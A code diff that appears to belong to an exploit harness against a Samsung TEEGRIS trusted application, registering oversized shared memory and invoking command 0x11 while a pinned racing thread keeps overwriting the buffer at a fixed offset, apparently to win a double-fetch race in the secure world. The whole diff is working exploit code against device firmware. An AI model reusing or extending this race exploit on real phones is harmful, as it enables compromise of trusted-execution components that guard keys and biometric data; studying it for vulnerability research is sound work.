@@ -40,26 +40,26 @@ typedef struct bs{
 
 void* mod_thread(void* arrg){
     bs* bsss = (bs*) arrg;
-    int* arg = bsss->buf0;
-    int* arg2 = bsss->buf1;
+    void* arg = (void*)bsss->buf0;
+    void* arg2 = (void*)bsss->buf1;
     cpu_set_t set;
     CPU_ZERO(&set);
     CPU_SET(1, &set);
     while(1){
-        for(int i=0; i<8; i++){
-
-        ((int*)arg)[i] = 0x800;
-        ((int*)arg2)[i] = 0x800;
-        ((int*)arg)[i] = 0x7fffffff;
-        ((int*)arg2)[i] = 0x7fffffff;
-        ((int*)arg)[i] = -1;
-        ((int*)arg2)[i] = -1;
-        ((int*)arg)[i] = 0x500000;
-        ((int*)arg2)[i] = 0x500000;
-        ((int*)arg)[i] = 0x10;
-        ((int*)arg2)[i] = 0x10;
-        }
-        
+        strcpy(arg+0x8200c, "hello :)\x00");
+        strcpy(arg2+0x8200c, "hello :)\x00");
+        /*
+        ((int*)arg)[0x1] = 0x800;
+        ((int*)arg2)[0x1] = 0x800;
+        ((int*)arg)[0x1] = 0x7fffffff;
+        ((int*)arg2)[0x1] = 0x7fffffff;
+        ((int*)arg)[0x1] = -1;
+        ((int*)arg2)[0x1] = -1;
+        ((int*)arg)[0x1] = 0x500000;
+        ((int*)arg2)[0x1] = 0x500000;
+        ((int*)arg)[0x1] = 0x10;
+        ((int*)arg2)[0x1] = 0x10;
+        */
     }
 }
 
@@ -76,17 +76,18 @@ void send_req(TEEC_Context *context, TEEC_Session *session)
 
     TEEC_Operation op;
     memset(&op, 0, sizeof(op));
-    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_WHOLE, TEEC_MEMREF_TEMP_OUTPUT,
+    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_WHOLE, TEEC_NONE,
                                      TEEC_NONE, TEEC_NONE);
     printf("params: 0x%lx\n", op.paramTypes);
-    char* buf = (char*)malloc(0x1000);
+    size_t buf_size = 0x212214; // 0x212010 for s10
+    char* buf = (char*)malloc(buf_size);
     TEEC_Result res; 
-    memset(buf, 0, 0x1000);
+    memset(buf, 0, buf_size);
   
     TEEC_SharedMemory in_mem;
     in_mem.buffer = buf;
-    in_mem.size = 0x1000;
-    in_mem.flags = TEEC_MEM_INPUT; //| TEEC_MEM_OUTPUT;
+    in_mem.size = buf_size;
+    in_mem.flags = TEEC_MEM_INPUT| TEEC_MEM_OUTPUT;
     res = TEEC_RegisterSharedMemory_impl(context, &in_mem);
     if (res != TEEC_SUCCESS) {
         printf("Failed to register shared memory 1 %d\n", res);
@@ -96,13 +97,12 @@ void send_req(TEEC_Context *context, TEEC_Session *session)
     pls* wow2 = (pls*)wow->ptr;
     void* shm = (void*)wow2->ptr;
     printf("shm ptr %p\n", shm);
-    
  
     op.params[0].memref.parent = &in_mem;  // the keyblock buffer
     //op.params[0].tmpref.buffer = (void*)malloc(0x1000);  // the keyblock buffer
     //op.params[0].tmpref.size =  0x1000; 
-    op.params[1].tmpref.buffer = (void*)malloc(0x1000);  // the keyblock buffer
-    op.params[1].tmpref.size =  0x1000; 
+    //op.params[1].tmpref.buffer = (void*)malloc(0x1000);  // the keyblock buffer
+    //op.params[1].tmpref.size =  0x1000; 
     uint32_t err_origin;
 
     pthread_t tid;
@@ -113,17 +113,15 @@ void send_req(TEEC_Context *context, TEEC_Session *session)
         perror("pthread_create failed");
         return;
     }
-    while(1){
-    res = TEEC_InvokeCommand_impl(session, 0xc0, &op, &err_origin);
+    //res = TEEC_InvokeCommand_impl(session, 0x12, &op, &err_origin);
+    res = TEEC_InvokeCommand_impl(session, 0x11, &op, &err_origin);
     printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
-    break;
-    }
 }
 
 
 int main(int argc, char **argv)
 {
-    char* ta = "00000000-0000-0000-0000-4662436b6d52";
+    char* ta = "00000000-0000-0000-0000-5345435f4652";
     TEEC_UUID *uuid = teegris_uuid(ta); 
 
     uint32_t err_origin;
@@ -131,7 +129,6 @@ int main(int argc, char **argv)
 	TEEC_Context context;
     TEEC_Session session;
 
-	cleanup_shm();
     load_functions();
 
     // Initialize context
